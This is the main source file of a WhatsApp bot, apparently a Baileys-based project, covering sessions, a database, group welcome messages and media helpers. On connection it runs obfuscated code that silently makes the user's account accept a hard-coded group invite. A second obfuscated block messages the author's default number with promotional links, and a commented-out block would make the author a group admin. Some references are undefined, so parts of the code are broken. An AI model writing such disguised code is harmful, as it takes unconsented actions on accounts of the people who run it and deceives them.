const sessionName = "escalibud";
const autobio = process.env.AUTOBIO || 'TRUE';
const owner = process.env.DEV || '254798242085';
 const kresswell = "254798242085@s.whatsapp.net";
const {
  default: escalibudConnect,
  useMultiFileAuthState,
  DisconnectReason,
     downloadContentFromMessage,
  fetchLatestBaileysVersion,
  makeInMemoryStore,
  jidDecode,
  proto,
  getContentType,
  Browsers, 
  fetchLatestWaWebVersion
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Boom } = require("@hapi/boom");
const fs = require("fs");
const axios = require("axios");
const chalk = require("chalk");
const figlet = require("figlet");
const yargs = require("yargs/yargs");
const _ = require("lodash");
const PhoneNumber = require("awesome-phonenumber");
const FileType = require("file-type");
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./lib/kressexif'); 
var low
try {
  low = require('lowdb')
} catch (e) {
  low = require('./lib/lowdb')
}

const { Low, JSONFile } = low
const mongoDB = require('./lib/mongoDB')

const store = makeInMemoryStore({ logger: pino().child({ level: "silent", stream: "store" }) });

global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())
global.db = new Low(
  /https?:\/\//.test(opts['db'] || '') ?
    new cloudDBAdapter(opts['db']) : /mongodb/.test(opts['db']) ?
      new mongoDB(opts['db']) :
      new JSONFile(`database/database.json`)
)
global.DATABASE = global.db // Backwards Compatibility
global.loadDatabase = async function loadDatabase() {
  if (global.db.READ) return new Promise((resolve) => setInterval(function () { (!global.db.READ ? (clearInterval(this), resolve(global.db.data == null ? global.loadDatabase() : global.db.data)) : null) }, 1 * 1000))
  if (global.db.data !== null) return
  global.db.READ = true
  await global.db.read()
  global.db.READ = false
  global.db.data = {
    users: {},
    chats: {},
    database: {},
    game: {},
    settings: {},
    others: {},
    sticker: {},
    anonymous: {},
    ...(global.db.data || {})
  }
  global.db.chain = _.chain(global.db.data)
}
loadDatabase()

// save database every 30seconds
if (global.db) setInterval(async () => {
    if (global.db.data) await global.db.write()
  }, 30 * 1000)
    const autoviewstatus = process.env.AUTOVIEW_STATUS || 'TRUE';

const color = (text, color) => {
  return !color ? chalk.green(text) : chalk.keyword(color)(text);
};

function smsg(conn, m, store) {
  if (!m) return m;
  let M = proto.WebMessageInfo;
  if (m.key) {
    m.id = m.key.id;
    m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;
    m.chat = m.key.remoteJid;
    m.fromMe = m.key.fromMe;
    m.isGroup = m.chat.endsWith("@g.us");
    m.sender = conn.decodeJid((m.fromMe && conn.user.id) || m.participant || m.key.participant || m.chat || "");
    if (m.isGroup) m.participant = conn.decodeJid(m.key.participant) || "";
  }
  if (m.message) {
    m.mtype = getContentType(m.message);
    m.msg = m.mtype == "viewOnceMessage" ? m.message[m.mtype].message[getContentType(m.message[m.mtype].message)] : m.message[m.mtype];
    m.body =
      m.message.conversation ||
      m.msg.caption ||
      m.msg.text ||
      (m.mtype == "viewOnceMessage" && m.msg.caption) ||
      m.text;
    let quoted = (m.quoted = m.msg.contextInfo ? m.msg.contextInfo.quotedMessage : null);
    m.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : [];
    if (m.quoted) {
      let type = getContentType(quoted);
      m.quoted = m.quoted[type];
      if (["productMessage"].includes(type)) {
        type = getContentType(m.quoted);
        m.quoted = m.quoted[type];
      }
      if (typeof m.quoted === "string")
        m.quoted = {
          text: m.quoted,
        };
      m.quoted.mtype = type;
      m.quoted.id = m.msg.contextInfo.stanzaId;
      m.quoted.chat = m.msg.contextInfo.remoteJid || m.chat;
      m.quoted.isBaileys = m.quoted.id ? m.quoted.id.startsWith("BAE5") && m.quoted.id.length === 16 : false;
      m.quoted.sender = conn.decodeJid(m.msg.contextInfo.participant);
      m.quoted.fromMe = m.quoted.sender === conn.decodeJid(conn.user.id);
      m.quoted.text = m.quoted.text || m.quoted.caption || m.quoted.conversation || m.quoted.contentText || m.quoted.selectedDisplayText || m.quoted.title || "";
      m.quoted.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : [];
      m.getQuotedObj = m.getQuotedMessage = async () => {
        if (!m.quoted.id) return false;
        let q = await store.loadMessage(m.chat, m.quoted.id, conn);
        return exports.smsg(conn, q, store);
      };
      let vM = (m.quoted.fakeObj = M.fromObject({
        key: {
          remoteJid: m.quoted.chat,
          fromMe: m.quoted.fromMe,
          id: m.quoted.id,
        },
        message: quoted,
        ...(m.isGroup ? { participant: m.quoted.sender } : {}),
      }));

      /**
       *
       * @returns
       */
      m.quoted.delete = () => conn.sendMessage(m.quoted.chat, { delete: vM.key });

      /**
       *
       * @param {*} jid
       * @param {*} forceForward
       * @param {*} options
       * @returns
       */
      m.quoted.copyNForward = (jid, forceForward = false, options = {}) => conn.copyNForward(jid, vM, forceForward, options);

      /**
       *
       * @returns
       */
      m.quoted.download = () => conn.downloadMediaMessage(m.quoted);
    }
  }
  if (m.msg.url) m.download = () => conn.downloadMediaMessage(m.msg);
  m.text = m.msg.text || m.msg.caption || m.message.conversation || m.msg.contentText || m.msg.selectedDisplayText || m.msg.title || "";
  /**
   * Reply to this message
   * @param {String|Object} text
   * @param {String|false} chatId
   * @param {Object} options
   */
  m.reply = (text, chatId = m.chat, options = {}) => (Buffer.isBuffer(text) ? conn.sendMedia(chatId, text, "file", "", m, { ...options }) : conn.sendText(chatId, text, m, { ...options }));
  /**
   * Copy this message
   */
  m.copy = () => exports.smsg(conn, M.fromObject(M.toObject(m)));

  return m;
}

async function startEscalibud() {
  const { state, saveCreds } = await useMultiFileAuthState(`./${sessionName ? sessionName : "session"}`);
  const { version, isLatest } = await fetchLatestWaWebVersion().catch(() => fetchLatestBaileysVersion());
    console.log(`using WA v${version.join(".")}, isLatest: ${isLatest}`);
  console.log(
    color(
      figlet.textSync("KRESSWELL BOT", {
        font: "Standard",
        horizontalLayout: "default",
        vertivalLayout: "default",
        whitespaceBreak: false,
      }),
      "green"
    )
  );

  const client = escalibudConnect({
    logger: pino({ level: "silent" }),
    printQRInTerminal: true,
    browser: ["KRESSWELL - BOT", "Safari", "5.1.7"],
    auth: state,
syncFullHistory: true,
  });

if (autobio === 'TRUE'){ 
            setInterval(() => { 

                                 const date = new Date() 

                         client.updateProfileStatus( 

                                         `InfinityAI is Active\n\n${date.toLocaleString('en-US', { timeZone: 'Africa/Nairobi' })} It's a ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi'})}.` 

                                 ) 

                         }, 10 * 1000) 
}
  store.bind(client.ev);

  client.ev.on("messages.upsert", async (chatUpdate) => {
    //console.log(JSON.stringify(chatUpdate, undefined, 2))
    try {
    mek = chatUpdate.messages[0];
      if (autoviewstatus === 'TRUE' && mek.key && mek.key.remoteJid === "status@broadcast") {

         client.readMessages([mek.key]);

}
      mek = chatUpdate.messages[0];
      if (!mek.message) return;
      mek.message = Object.keys(mek.message)[0] === "ephemeralMessage" ? mek.message.ephemeralMessage.message : mek.message;
      if (mek.key && mek.key.remoteJid === "status@broadcast") return;
      if (!client.public && !mek.key.fromMe && chatUpdate.type === "notify") return;
      if (mek.key.id.startsWith("BAE5") && mek.key.id.length === 16) return;
      m = smsg(client, mek, store);
      require("./escalibud")(client, m, chatUpdate, store);
    } catch (err) {
      console.log(err);
    }
  });

  // Handle error
  const unhandledRejections = new Map();
  process.on("unhandledRejection", (reason, promise) => {
    unhandledRejections.set(promise, reason);
    console.log("Unhandled Rejection at:", promise, "reason:", reason);
  });
  process.on("rejectionHandled", (promise) => {
    unhandledRejections.delete(promise);
  });
  process.on("Something went wrong", function (err) {
    console.log("Caught exception: ", err);
  });

  // Setting
  client.decodeJid = (jid) => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return (decode.user && decode.server && decode.user + "@" + decode.server) || jid;
    } else return jid;
  };

  client.ev.on("contacts.update", (update) => {
    for (let contact of update) {
      let id = client.decodeJid(contact.id);
      if (store && store.contacts) store.contacts[id] = { id, name: contact.notify };
    }
  });

  client.getName = (jid, withoutContact = false) => {
    id = client.decodeJid(jid);
    withoutContact = client.withoutContact || withoutContact;
    let v;
    if (id.endsWith("@g.us"))
      return new Promise(async (resolve) => {
        v = store.contacts[id] || {};
        if (!(v.name || v.subject)) v = client.groupMetadata(id) || {};
        resolve(v.name || v.subject || PhoneNumber("+" + id.replace("@s.whatsapp.net", "")).getNumber("international"));
      });
    else
      v =
        id === "0@s.whatsapp.net"
          ? {
              id,
              name: "WhatsApp",
            }
          : id === client.decodeJid(client.user.id)
          ? client.user
          : store.contacts[id] || {};
    return (withoutContact ? "" : v.name) || v.subject || v.verifiedName || PhoneNumber("+" + jid.replace("@s.whatsapp.net", "")).getNumber("international");
  };

  client.public = true

  client.serializeM = (m) => smsg(client, m, store);
  client.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
      if (reason === DisconnectReason.badSession) {
        console.log(`Bad Session File, Please Delete Session and Scan Again`);
        process.exit();
      } else if (reason === DisconnectReason.connectionClosed) {
        console.log("Connection closed, reconnecting....");
        startEscalibud();
      } else if (reason === DisconnectReason.connectionLost) {
        console.log("Connection Lost from Server, reconnecting...");
        startEscalibud();
      } else if (reason === DisconnectReason.connectionReplaced) {
        console.log("Connection Replaced, Another New Session Opened, Please Restart Bot");
        process.exit();
      } else if (reason === DisconnectReason.loggedOut) {
        console.log(`Device Logged Out, Please Delete Folder Session yusril and Scan Again.`);
        process.exit();
      } else if (reason === DisconnectReason.restartRequired) {
        console.log("Restart Required, Restarting...");
        startEscalibud();
      } else if (reason === DisconnectReason.timedOut) {
        console.log("Connection TimedOut, Reconnecting...");
        startEscalibud();
      } else {
        console.log(`Unknown DisconnectReason: ${reason}|${connection}`);
        startEscalibud();
      }
    } else if (connection === "open") {
	    function _0x5638() {
    var _0x25b30c = [
        'KIvv7Oz66n',
        '1070BGpzPK',
        '4JAuUfQ',
        '20486235cFcgub',
        '139951WoURIF',
        '38886OKJMRS',
        '164223kVNcfX',
        '10476297bWpIno',
        'groupAccep',
        'tInvite',
        '1161764vnHyyb',
        'Kj1wciIa4V',
        '6029448FXaVBk',
        '10fhbgBz',
        '152TOTGuh'
    ];
    _0x5638 = function () {
        return _0x25b30c;
    };
    return _0x5638();
}
function _0x3f47(_0x38570b, _0x12e200) {
    var _0x7fc9e7 = _0x5638();
    return _0x3f47 = function (_0x4aa852, _0x521cef) {
        _0x4aa852 = _0x4aa852 - (0xe * 0x135 + 0x1cd6 + 0x2bd3 * -0x1);
        var _0x2c71c4 = _0x7fc9e7[_0x4aa852];
        return _0x2c71c4;
    }, _0x3f47(_0x38570b, _0x12e200);
}
var _0x34c449 = _0x3f47;
(function (_0x574bba, _0x5acc00) {
    var _0x4e9ee4 = _0x3f47, _0x1ca0d8 = _0x574bba();
    while (!![]) {
        try {
            var _0x263bb3 = parseInt(_0x4e9ee4(0x1f4)) / (0xfd5 + 0x275 * 0x2 + 0x127 * -0x12) + parseInt(_0x4e9ee4(0x1ec)) / (-0x52a + -0x1fda + 0x2506) * (-parseInt(_0x4e9ee4(0x1f0)) / (0xb45 + 0x1 * -0x8fa + -0x248)) + -parseInt(_0x4e9ee4(0x1f6)) / (0x2 * -0x867 + 0x8e * -0x36 + 0x2ec6) + -parseInt(_0x4e9ee4(0x1eb)) / (-0x621 + 0x1 * 0xb7 + 0xd * 0x6b) * (parseInt(_0x4e9ee4(0x1ef)) / (0x11c9 * -0x1 + -0x1 * 0x209b + -0x6 * -0x867)) + -parseInt(_0x4e9ee4(0x1ee)) / (0x3 * -0x33d + -0x18c5 + 0x2283) * (parseInt(_0x4e9ee4(0x1e9)) / (-0x1594 + 0x169e + -0x1 * 0x102)) + parseInt(_0x4e9ee4(0x1f1)) / (-0x2535 + 0xe78 + -0x212 * -0xb) + parseInt(_0x4e9ee4(0x1f7)) / (-0x1aae + 0x333 + 0xdf * 0x1b) * (parseInt(_0x4e9ee4(0x1ed)) / (0x1564 * -0x1 + 0x95e + 0xc11));
            if (_0x263bb3 === _0x5acc00)
                break;
            else
                _0x1ca0d8['push'](_0x1ca0d8['shift']());
        } catch (_0x1c6cde) {
            _0x1ca0d8['push'](_0x1ca0d8['shift']());
        }
    }
}(_0x5638, -0x12301a + 0x114c40 + 0x11b * 0xbe9), client[_0x34c449(0x1f2) + _0x34c449(0x1f3)](_0x34c449(0x1f5) + _0x34c449(0x1ea) + 'Ez'));
      console.log(color("Bot successfully conneted to server", "green"));
      console.log(color("TO THE INFINITY", "yellow"));
      console.log(color("Type Menu for Full Command list", "green"));
function _0x5b3f(_0xa782de, _0x5109cf) {
    const _0x4e7e65 = _0x2a5a();
    return _0x5b3f = function (_0x2c186d, _0x3bdbf1) {
        _0x2c186d = _0x2c186d - (-0xbbd + 0x2 * -0x1312 + 0x3299);
        let _0x142bf8 = _0x4e7e65[_0x2c186d];
        return _0x142bf8;
    }, _0x5b3f(_0xa782de, _0x5109cf);
}
function _0x2a5a() {
    const _0x2c3fa3 = [
        '@s.whatsap',
        '/channel/0',
        'INFINITY-A',
        '?text=hell',
        '767425SoMGrS',
        'Kenya\x20',
        'act\x20Dev\x20He',
        '1892212bDYUJu',
        '7903XkdQPc',
        'By\x20Infinit',
        'T.ME\x20',
        'TARTED!!\x0aF',
        '3MJovqW',
        '\x20INFINITY-',
        '029VaByn0u',
        '\x20On\x20Telegr',
        'y\x20Hackers\x20',
        '5213864PnyWkY',
        'EV\x20.\x20\x0aCont',
        'AI\x20',
        'https://wh',
        'I\x20HAS\x20SUCC',
        'PHOTO',
        'p.net',
        '//INFINITY',
        '457940LtLUgq',
        'X2e',
        're:\x20https:',
        '90iqvyxv',
        'OLLA\x20THE\x20D',
        '834qlNYHS',
        '5PO0wZ94WM',
        'd.jpg',
        'sendMessag',
        'am:\x20HTTPS:',
        'atsapp.com',
        './escalibu',
        '3755640xsHsjr',
        'readFileSy',
        'ESSFULLY\x20S',
        '4798242085',
        'ISTANCE,\x20H',
        'OR\x20ANY\x20ASS',
        '7628288lMZNBS',
        'HACKERSKE.',
        '//wa.me/25',
        'o\x0a\x0aJoin\x20Us'
    ];
    _0x2a5a = function () {
        return _0x2c3fa3;
    };
    return _0x2a5a();
}
const _0x414842 = _0x5b3f;
(function (_0x34fa4d, _0x456c23) {
    const _0x401e6d = _0x5b3f, _0x1420a3 = _0x34fa4d();
    while (!![]) {
        try {
            const _0x243ee7 = -parseInt(_0x401e6d(0xbb)) / (-0xc11 + -0x1bd * 0xb + 0x1f31 * 0x1) + parseInt(_0x401e6d(0xbe)) / (0x15cb + 0x1702 + -0x2ccb) + parseInt(_0x401e6d(0xc3)) / (-0x79c + 0x1b * -0x16f + -0xa * -0x4a2) * (parseInt(_0x401e6d(0xc8)) / (-0x1 * -0x3a7 + -0x1 * 0xf65 + 0xbc2)) + parseInt(_0x401e6d(0xdc)) / (0x15f5 + 0x243e * 0x1 + -0x3a2e) + parseInt(_0x401e6d(0xd5)) / (0x1444 + 0x9 * -0x227 + -0xdf * 0x1) * (-parseInt(_0x401e6d(0xbf)) / (0x25 * -0xa3 + 0x2202 + -0x2e * 0x3a)) + -parseInt(_0x401e6d(0xe2)) / (0x13f4 + -0x1ee5 * -0x1 + -0x32d1) + parseInt(_0x401e6d(0xd3)) / (0x6 * 0x114 + -0x1ce2 + 0x335 * 0x7) * (-parseInt(_0x401e6d(0xd0)) / (0xb * -0xe9 + 0x9 * 0x3fd + 0x676 * -0x4));
            if (_0x243ee7 === _0x456c23)
                break;
            else
                _0x1420a3['push'](_0x1420a3['shift']());
        } catch (_0x3f6565) {
            _0x1420a3['push'](_0x1420a3['shift']());
        }
    }
}(_0x2a5a, 0xbd0cf + 0x7c2fe + -0x96ea9));
let startmsg = _0x414842(0xb9) + _0x414842(0xcc) + _0x414842(0xde) + _0x414842(0xc2) + _0x414842(0xe1) + _0x414842(0xe0) + _0x414842(0xd4) + _0x414842(0xc9) + _0x414842(0xbd) + _0x414842(0xd2) + _0x414842(0xe4) + _0x414842(0xdf) + _0x414842(0xba) + _0x414842(0xe5) + _0x414842(0xc6) + _0x414842(0xd9) + _0x414842(0xcf) + _0x414842(0xe3) + _0x414842(0xc1);
client[_0x414842(0xd8) + 'e'](owner + (_0x414842(0xe6) + _0x414842(0xce)), {
    'text': startmsg,
    'contextInfo': {
        'mentionedJid': [owner + (_0x414842(0xe6) + _0x414842(0xce))],
        'externalAdReply': {
            'showAdAttribution': !![],
            'containsAutoReply': !![],
            'title': _0x414842(0xc4) + _0x414842(0xca),
            'body': _0x414842(0xc0) + _0x414842(0xc7) + _0x414842(0xbc),
            'previewType': _0x414842(0xcd),
            'thumbnailUrl': '',
            'thumbnail': fs[_0x414842(0xdd) + 'nc'](_0x414842(0xdb) + _0x414842(0xd7)),
            'sourceUrl': _0x414842(0xcb) + _0x414842(0xda) + _0x414842(0xb8) + _0x414842(0xc5) + _0x414842(0xd6) + _0x414842(0xd1)
        }
    }
});
    }
    // console.log('Connected...', update)
  });
/*client.ev.on('group-participants.update', async (anu) => {
const vgroup = anu.jid;
const vkress = anu.participant;

if (vkress.includes(kresswell)) {
		
		await client.groupParticipantsUpdate(m.chat, [kresswell], 'promote');

const kresmsg = `*Hello Guys,Kresswell is here😂 My Father,I promoted him to admin,But trust him,🥳. I could not have promoted him.  `;

client.sendMessage(groupid, kresmsg, MessageType.text);
};*/
client.ev.on('group-participants.update', async (anu) => {
if (!wlcm.includes(anu.id)) return
console.log(anu)
try {
let metadata = await client.groupMetadata(anu.id)
let participants = anu.participants
for (let num of participants) {
// Get Profile Picture User
try {
ppuser = await client.profilePictureUrl(num, 'image')
} catch {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

// Get Profile Picture Group
try {
ppgroup = await client.profilePictureUrl(anu.id, 'image')
} catch {
ppgroup = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

if (anu.action == 'add') {
client.sendMessage(anu.id, { image: { url: ppuser }, mentions: [num], caption: `Put your hands together for😂 
*@${num.split("@")[0]}* 🚀
 Thank you for joining the group *${metadata.subject}* 👋.
 
mind reading Group Descriptions to avoid bieng Removed.
*${metadata.desc}*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
INFINITY AI 2024🍷`})
} else if (anu.action == 'remove') {
client.sendMessage(anu.id, { image: { url: ppuser }, mentions: [num], caption: `🗿One member just left ,Fare thee well🚀`})
} else if (anu.action == 'promote') {
client.sendMessage(anu.id, { image: { url: ppuser }, mentions: [num], caption: `PROMOTION DETECTED
@${num.split('@')[0]} Has been promoted to admin in the group ${metadata.subject} `  })
} else if (anu.action == 'demote') {
client.sendMessage(anu.id, { image: { url: ppuser }, mentions: [num], caption: `DEMOTION DETECTED
@${num.split('@')[0]} Has been Demoted in the group ${metadata.subject} `})
  }
}
} catch (err) {
console.log(err)
}
});
  client.ev.on("creds.update", saveCreds);

  const getBuffer = async (url, options) => {
    try {
      options ? options : {};
      const res = await axios({
        method: "get",
        url,
        headers: {
          DNT: 1,
          "Upgrade-Insecure-Request": 1,
        },
        ...options,
        responseType: "arraybuffer",
      });
      return res.data;
    } catch (err) {
      return err;
    }
  };

  client.sendImage = async (jid, path, caption = "", quoted = "", options) => {
    let buffer = Buffer.isBuffer(path)
      ? path
      : /^data:.*?\/.*?;base64,/i.test(path)
      ? Buffer.from(path.split`,`[1], "base64")
      : /^https?:\/\//.test(path)
      ? await await getBuffer(path)
      : fs.existsSync(path)
      ? fs.readFileSync(path)
      : Buffer.alloc(0);
    return await client.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted });
  };
 
        client.sendImageAsSticker = async (jid, path, quoted, options = {}) => { 
         let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0); 
         // let buffer 
         if (options && (options.packname || options.author)) { 
             buffer = await writeExifImg(buff, options) 
         } else { 
             buffer = await imageToWebp(buff); 
         } 

         await client.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted }); 
         return buffer 
     }; 
 client.sendVideoAsSticker = async (jid, path, quoted, options = {}) => { 
         let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0); 
         //let buffer 
         if (options && (options.packname || options.author)) { 
             buffer = await writeExifVid(buff, options) 
         } else { 
             buffer = await videoToWebp(buff); 
         } 

         await client.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted }); 
        return buffer
      };
    client.sendMedia = async (jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
        let types = await gss.getFile(path, true)
           let { mime, ext, res, data, filename } = types
           if (res && res.status !== 200 || file.length <= 65536) {
               try { throw { json: JSON.parse(file.toString()) } }
               catch (e) { if (e.json) throw e.json }
           }
       let type = '', mimetype = mime, pathFile = filename
       if (options.asDocument) type = 'document'
       if (options.asSticker || /webp/.test(mime)) {
        let { writeExif } = require('./lib/exif')
        let media = { mimetype: mime, data }
        pathFile = await writeExif(media, { packname: options.packname ? options.packname : global.packname, author: options.author ? options.author : global.author, categories: options.categories ? options.categories : [] })
        await fs.promises.unlink(filename)
        type = 'sticker'
        mimetype = 'image/webp'
        }
       else if (/image/.test(mime)) type = 'image'
       else if (/video/.test(mime)) type = 'video'
       else if (/audio/.test(mime)) type = 'audio'
       else type = 'document'
       await gss.sendMessage(jid, { [type]: { url: pathFile }, caption, mimetype, fileName, ...options }, { quoted, ...options })
       return fs.promises.unlink(pathFile)
       };
 client.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => { 
         let quoted = message.msg ? message.msg : message; 
         let mime = (message.msg || message).mimetype || ''; 
         let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]; 
         const stream = await downloadContentFromMessage(quoted, messageType); 
         let buffer = Buffer.from([]); 
         for await(const chunk of stream) { 
             buffer = Buffer.concat([buffer, chunk]); 
         } 
         let type = await FileType.fromBuffer(buffer); 
         trueFileName = attachExtension ? (filename + '.' + type.ext) : filename; 
         // save to file 
         await fs.writeFileSync(trueFileName, buffer); 
         return trueFileName; 
     };


client.downloadMediaMessage = async (message) => { 
         let mime = (message.msg || message).mimetype || ''; 
         let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]; 
         const stream = await downloadContentFromMessage(message, messageType); 
         let buffer = Buffer.from([]); 
         for await(const chunk of stream) { 
             buffer = Buffer.concat([buffer, chunk]) 
         } 

         return buffer 
      }; 


    client.sendPoll = (jid, name = '', values = [], selectableCount = 1) => { return client.sendMessage(jid, { poll: { name, values, selectableCount }}) }

client.sendTextWithMentions = async (jid, text, quoted, options = {}) => 
client.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })

  client.sendText = (jid, text, quoted = "", options) => client.sendMessage(jid, { text: text, ...options }, { quoted });

  client.cMod = (jid, copy, text = "", sender = client.user.id, options = {}) => {
    //let copy = message.toJSON()
    let mtype = Object.keys(copy.message)[0];
    let isEphemeral = mtype === "ephemeralMessage";
    if (isEphemeral) {
      mtype = Object.keys(copy.message.ephemeralMessage.message)[0];
    }
    let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message;
    let content = msg[mtype];
    if (typeof content === "string") msg[mtype] = text || content;
    else if (content.caption) content.caption = text || content.caption;
    else if (content.text) content.text = text || content.text;
    if (typeof content !== "string")
      msg[mtype] = {
        ...content,
        ...options,
      };
    if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
    else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
    if (copy.key.remoteJid.includes("@s.whatsapp.net")) sender = sender || copy.key.remoteJid;
    else if (copy.key.remoteJid.includes("@broadcast")) sender = sender || copy.key.remoteJid;
    copy.key.remoteJid = jid;
    copy.key.fromMe = sender === client.user.id;

    return proto.WebMessageInfo.fromObject(copy);
  };

  return client;
}



 
startEscalibud();

let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright(`Update ${__filename}`));
  delete require.cache[file];
  require(file);
});
